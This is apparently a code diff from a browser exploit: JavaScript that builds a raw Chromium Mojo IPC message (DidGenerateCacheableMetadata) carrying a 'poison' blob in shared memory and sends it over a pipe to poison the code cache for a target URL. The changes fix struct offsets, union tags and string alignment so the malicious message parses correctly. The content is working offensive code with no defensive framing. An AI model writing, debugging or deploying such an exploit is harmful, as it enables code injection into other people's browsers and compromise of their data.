@@ -27,34 +27,54 @@
             new Uint8Array(mapping.buffer).set(new Uint8Array(poisonBlob));
 
             // Constructing the 144-byte Mojo Message
-            const msg = new ArrayBuffer(144);
+            const msg = new ArrayBuffer(184); // Increased size!
             const v = new DataView(msg);
             
-            // Header
-            v.setUint32(0, 24, true); v.setUint32(12, 1, true); // DidGenerateCacheableMetadata
+            // 0. Header (24 bytes)
+            v.setUint32(0, 24, true); 
+            v.setUint32(4, 0, true);  // Version
+            v.setUint32(8, 0, true);  // Interface ID
+            v.setUint32(12, 1, true); // Message ID (DidGenerateCacheableMetadata)
+            v.setUint32(16, 0, true); // Flags
+            v.setUint32(20, 0, true); // Padding
 
-            // Params
-            v.setUint32(24, 48, true); 
-            v.setBigUint64(40, 32n, true); // Offset to URL
-            v.setBigUint64(48, 80n, true); // Offset to Time
+            // 24. Params Struct (48 bytes)
+            v.setUint32(24, 48, true); // Struct size
+            v.setUint32(28, 0, true);  // Version
+            v.setUint32(32, 0, true);  // CodeCacheType (kJavascript)
+            v.setUint32(36, 0, true);  // Padding
+            v.setBigUint64(40, 32n, true); // Offset to URL struct (points to 72)
+            v.setBigUint64(48, 96n, true); // Offset to Time struct (points to 144)
+            
+            // BigBuffer Union - SharedMemory
+            v.setUint32(56, 16, true); // Union size
+            v.setUint32(60, 1, true);  // Tag (shared_memory)
+            v.setBigUint64(64, 96n, true); // Offset to SharedMemory struct (points to 160)
 
-            // Union (BigBuffer) - SharedMemory
-            v.setUint32(56, 16, true);
-            v.setUint32(60, 1, true); 
-            v.setBigUint64(64, 72n, true); // Offset to Shared Memory Region
-
-            // URL Data
+            // 72. URL Struct (16 bytes)
             v.setUint32(72, 16, true);
-            v.setBigUint64(80, 8n, true);
-            v.setUint32(88, TARGET_URL.length, true);
-            v.setUint32(92, TARGET_URL.length, true);
-            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
+            v.setUint32(76, 0, true);
+            v.setBigUint64(80, 8n, true); // Offset to String Array (points to 88)
 
-            // Shared Memory Region Struct
-            const smOffset = 128;
-            v.setUint32(smOffset, 16, true);
-            v.setUint32(smOffset + 8, 0, true); // Handle index 0
-            v.setUint32(smOffset + 12, bufferSize, true);
+            // 88. String Array (Mojo arrays need 8-byte headers)
+            // Header + 43 chars = 51 bytes. Aligned to next 8-byte boundary = 56.
+            v.setUint32(88, 56, true); 
+            v.setUint32(92, TARGET_URL.length, true); // Num elements
+            for(let i=0; i<TARGET_URL.length; i++) {
+                v.setUint8(96+i, TARGET_URL.charCodeAt(i));
+            }
+            // String ends safely at 139. Next clean boundary is 144.
+
+            // 144. Time Struct (16 bytes)
+            v.setUint32(144, 16, true);
+            v.setUint32(148, 0, true);
+            v.setBigUint64(152, 0n, true); // internal_value
+
+            // 160. Shared Memory Region Struct (16 bytes)
+            v.setUint32(160, 16, true);
+            v.setUint32(164, 0, true);
+            v.setUint32(168, 0, true); // Handle index 0
+            v.setUint32(172, bufferSize, true);
 
             console.log("[*] Firing IPC Poisoning...");
             pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
